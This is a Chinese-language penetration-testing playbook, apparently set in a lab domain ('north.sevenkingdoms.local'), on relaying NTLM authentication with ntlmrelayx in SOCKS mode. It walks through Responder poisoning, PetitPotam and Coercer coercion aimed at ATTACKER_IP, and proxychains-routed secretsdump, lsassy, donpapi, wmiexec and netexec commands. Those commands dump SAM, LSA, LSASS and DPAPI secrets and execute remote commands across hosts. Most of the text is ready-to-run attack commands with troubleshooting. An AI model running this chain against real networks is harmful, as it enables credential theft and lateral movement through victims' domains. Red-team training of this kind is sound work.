# SOCKS 代理横向移动

ntlmrelayx 的 SOCKS 代理模式将中继成功的认证会话保持在连接池中，允许多种工具复用已认证的连接，无需重新投毒或触发认证。

---

## 1. ntlmrelayx SOCKS 代理

### 启动参数

```bash
impacket-ntlmrelayx -tf targets.txt -smb2support -socks -of hashes.txt
```

| 参数 | 作用 |
|------|------|
| `-socks` | 启用 SOCKS4 代理，监听 127.0.0.1:1080 |
| `-of` | 同时保存捕获的 Hash（备份） |
| `-smb2support` | 支持 SMBv2/v3 |
| `-tf` | 目标列表文件 |

### 会话管理

在 ntlmrelayx 交互终端中查看活跃会话：

```
ntlmrelayx> socks
Protocol  Target          Username           AdminStatus  Port
--------  --------------  -----------------  -----------  ----
SMB       10.10.10.22     NORTH/EDDARD.STARK TRUE         445
SMB       10.10.10.23     NORTH/ROBB.STARK   FALSE        445
LDAP      10.10.10.1      NORTH/DC01$        TRUE         389
```

### 会话键格式

每个会话由以下要素唯一标识：
- 协议（SMB / LDAP / HTTP）
- 目标 IP
- **NetBIOS 短域名**（如 `NORTH`）
- 用户名

---

## 2. 域名格式要求

**关键**：通过 SOCKS 代理使用工具时，必须使用 NetBIOS 短域名，不能使用 FQDN。

| 格式 | 示例 | 是否正确 |
|------|------|----------|
| NetBIOS 短名 | `NORTH/EDDARD.STARK` | 正确 |
| FQDN | `north.sevenkingdoms.local/EDDARD.STARK` | 错误，会话匹配失败 |
| 无域名 | `EDDARD.STARK` | 错误，无法匹配 |

工具调用时的域名必须与 `socks` 命令输出中的 Username 列完全一致。

---

## 3. proxychains 配置

编辑 `/etc/proxychains4.conf`：

```ini
# 使用 dynamic_chain 提高灵活性
#strict_chain
dynamic_chain

# 减少输出噪声
quiet_mode

[ProxyList]
socks4 127.0.0.1 1080
```

### 基本调用语法

```bash
proxychains4 -q <tool> -no-pass DOMAIN/USER@TARGET
```

- `-q`：静默模式，不输出 proxychains 调试信息
- `-no-pass`：不提供密码（认证由 SOCKS 会话处理）

---

## 4. 通过代理路由工具

### secretsdump（转储凭据）

```bash
# 转储 SAM / LSA / cached credentials
proxychains4 -q impacket-secretsdump -no-pass NORTH/EDDARD.STARK@10.10.10.22
```

提取内容：
- 本地用户 NTLM Hash
- 缓存的域凭据 (DCC2)
- LSA 机密（服务账户密码）
- 机器账户 Hash

### lsassy（LSASS 内存提取）

```bash
proxychains4 -q lsassy --no-pass -d NORTH -u EDDARD.STARK 10.10.10.22
```

提取内容：
- 活跃会话凭据
- Kerberos 票据（TGT/TGS）
- 内存中的 NTLM Hash

### donpapi（DPAPI 机密提取）

```bash
proxychains4 -q donpapi collect -d 'NORTH' -u 'EDDARD.STARK' -p '' --no-pass -t 10.10.10.22
```

提取内容：
- 浏览器保存的密码
- Windows 凭据管理器
- WiFi 密码
- RDP 保存的凭据

### smbclient（文件操作）

```bash
# 交互式 SMB 客户端
proxychains4 -q impacket-smbclient -no-pass NORTH/EDDARD.STARK@10.10.10.22

# 列出共享
proxychains4 -q netexec smb 10.10.10.22 -u 'EDDARD.STARK' -p '' -d 'NORTH' --shares

# 搜索共享内容
proxychains4 -q netexec smb 10.10.10.22 -u 'EDDARD.STARK' -p '' -d 'NORTH' -M spider_plus
```

### wmiexec（远程命令执行）

```bash
proxychains4 -q impacket-wmiexec -no-pass NORTH/EDDARD.STARK@10.10.10.22
```

### netexec 系列操作

```bash
# SAM 转储
proxychains4 -q netexec smb TARGET -u 'USER' -p '' -d 'NORTH' --sam

# DPAPI 转储
proxychains4 -q netexec smb TARGET -u 'USER' -p '' -d 'NORTH' --dpapi

# LSA 转储
proxychains4 -q netexec smb TARGET -u 'USER' -p '' -d 'NORTH' --lsa
```

---

## 5. 会话生命周期管理

### 会话保活条件

会话在以下条件下保持存活：
1. ntlmrelayx 进程持续运行
2. 目标未主动断开连接
3. 网络连接正常

### 会话超时

- SMB 会话通常有空闲超时（默认约 15 分钟）
- LDAP 会话超时取决于服务器配置
- 频繁使用可延长会话寿命

### 会话刷新

当会话过期时：
1. 等待受害者触发新的广播查询（被动）
2. 使用 PetitPotam / PrinterBug 主动触发新认证（主动）
3. 新会话自动加入连接池

---

## 6. 实战场景：捕获高权限认证 → SOCKS 横向移动

### 场景描述

通过 Responder 投毒或强制认证捕获域管/高权限用户认证，利用 SOCKS 代理横向移动到多台主机。

### 完整流程

**准备阶段**：

```bash
# 1. 生成中继目标列表（无 SMB 签名的主机）
netexec smb 10.10.10.0/24 --gen-relay-list targets.txt

# 2. 配置 Responder（关闭 SMB/HTTP）
# /etc/responder/Responder.conf: SMB=Off, HTTP=Off

# 3. 启动 Responder
sudo responder -I eth0 -dw -v
```

**启动中继**：

```bash
# 4. 启动 ntlmrelayx SOCKS 模式
impacket-ntlmrelayx -tf targets.txt -smb2support -socks -of hashes.txt
```

**触发认证**：

```bash
# 5. 主动触发高权限机器认证
python3 PetitPotam.py -u USER -p PASS -d DOMAIN ATTACKER_IP DC_IP

# 或使用 Coercer 自动尝试
coercer coerce -t DC_IP -l ATTACKER_IP -u USER -p PASS -d DOMAIN
```

**横向移动**：

```bash
# 6. 检查捕获的会话
ntlmrelayx> socks
# 确认 AdminStatus = TRUE 的会话

# 7. 通过 SOCKS 转储多台主机凭据
proxychains4 -q impacket-secretsdump -no-pass NORTH/EDDARD.STARK@10.10.10.22
proxychains4 -q impacket-secretsdump -no-pass NORTH/EDDARD.STARK@10.10.10.23

# 8. 通过 SOCKS 提取 LSASS
proxychains4 -q lsassy --no-pass -d NORTH -u EDDARD.STARK 10.10.10.22

# 9. 通过 SOCKS 提取 DPAPI 机密
proxychains4 -q donpapi collect -d 'NORTH' -u 'EDDARD.STARK' -p '' --no-pass -t 10.10.10.22
```

---

## 常见问题排查

| 问题 | 原因 | 解决方案 |
|------|------|----------|
| "Session not found" | 域名格式错误 | 使用 NetBIOS 短名（`NORTH` 而不是 `north.sevenkingdoms.local`） |
| "Connection refused" | 会话已过期或目标断开 | 重新触发认证获取新会话 |
| "Access denied" | 用户在目标上无管理员权限 | 检查 `socks` 输出中的 AdminStatus |
| 代理速度慢 | proxychains 开销 | 配置中启用 `quiet_mode` 和 `dynamic_chain` |
| 工具无输出 | proxychains 未正确配置 | 检查 `/etc/proxychains4.conf` 中 socks4 127.0.0.1 1080 |
